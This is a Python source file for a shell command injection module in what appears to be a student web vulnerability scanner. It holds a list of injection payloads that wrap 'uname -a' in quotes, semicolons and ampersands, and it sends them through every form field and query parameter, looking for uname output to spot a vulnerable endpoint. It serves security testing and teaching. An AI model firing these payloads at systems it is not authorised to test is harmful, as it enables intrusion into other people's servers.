from AttackModule import AttackModule
from Helpers import Helper
from AttackReport import AttackReport

# Dangerous inputs for PHP based web servers
# https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html
# https://github.com/PortSwigger/command-injection-attacker
#

class ShlCmdInjAttackModule(AttackModule):
	attackPatterns = [
		"uname -a",	
		"uname -a #",
		"; uname -a",
		"; uname -a;",
		"; uname -a; ",

		"\'uname -a\'",	
		"\'uname -a #\'",
		"\'; uname -a\'",
		"\'; uname -a;\'",
		"\'; uname -a; \'",

		"\"uname -a\"",	
		"\"uname -a #\"",
		"\"; uname -a\"",
		"\"; uname -a;\"",
		"\"; uname -a; \"",

		" & uname -a",	
		" & uname -a #",
		" & uname -a; ",
		"& uname -a",
		"& uname -a #",
		"& uname -a; ",

		"\' & uname -a\'",	
		"\' & uname -a #\'",
		"\' & uname -a; \'",
		"\'& uname -a\'",
		"\'& uname -a #\'",
		"\'& uname -a; \'",

		"\" & uname -a\"",	
		"\" & uname -a #\"",
		"\" & uname -a; \"",
		"\"& uname -a\"",
		"\"& uname -a #\"",
		"\"& uname -a; \"",
	]
	unameStrings = [
		"Linux student-CS5331-A2 3.13.0-32-generic",
		"Linux xefro-ux 4.13.0-38-generic",
		"Linux ubuntu-xenial 4.4.0-116-generic"
	]


	def __init__(self):
		AttackModule.__init__(self, "Shell Command Injection", "Command Injection")
		

	def attack(self, endpoint):
		print "    Beginning attack -> Shell Command Injection"
		self.attack_succeeded = False
		self.attack_report = None
		if True not in (endpoint.is_form(), endpoint.has_query_string()):
			print "    Target: {0}\n    Is not a form, nor a has a query string. Skipping!".format(endpoint.url)
			return
		
		totalAttacks = len(ShlCmdInjAttackModule.attackPatterns)
		attackCounter = 1
		for attackPattern in ShlCmdInjAttackModule.attackPatterns:
			result = self.launch_attack(endpoint, attackPattern)
			if result:
				self.attack_succeeded = True
				print "    [ ShlCmdInj: {0} / {1}, {2} ] ->".format(attackCounter, totalAttacks, attackPattern),
				print result
				break
			else:
				attackCounter += 1

		if self.attack_succeeded:
			print "    Finished attack -> VULNERABLE!\n"
		else:
			print "    Finished attack -> Nothing found!\n"
			
	
	def launch_attack(self, endpoint, payload):
		headers = {}
		formData = self.get_form_data(endpoint)
		
		for key in formData.keys():
			formData = self.get_form_data(endpoint)
			formData[key] = payload
			res = None
			if endpoint.method.upper() == "GET":
				res = Helper.do_get_request(endpoint, headers, formData)
			elif endpoint.method.upper() == "POST":
				res = Helper.do_post_request(endpoint, headers, formData)

			if self.is_attack_successful(res):
				report = AttackReport(self.attackClass, endpoint, headers, formData, "")
				AttackReport.add_attack_report(report)
				return True

		return False

	def get_form_data(self, endpoint):
		formData = {}
		if endpoint.is_form():
			formData = endpoint.get_form().get_form_data_dict()
		elif endpoint.has_query_string():
			formData = endpoint.get_query_string_dict()
		return formData

	def is_attack_successful(self, res):
		if res.ok:
			if res.status_code == 200:
				if any(match in res.text for match in ShlCmdInjAttackModule.unameStrings):
					return True
			else:
				print "WARNING: ShlCmdInjAttackModule, " + \
					"is_attack_successful, unrecognized status code: {0} for {1}".format(
						res.status_code, res.request.url)
		return False
			
		
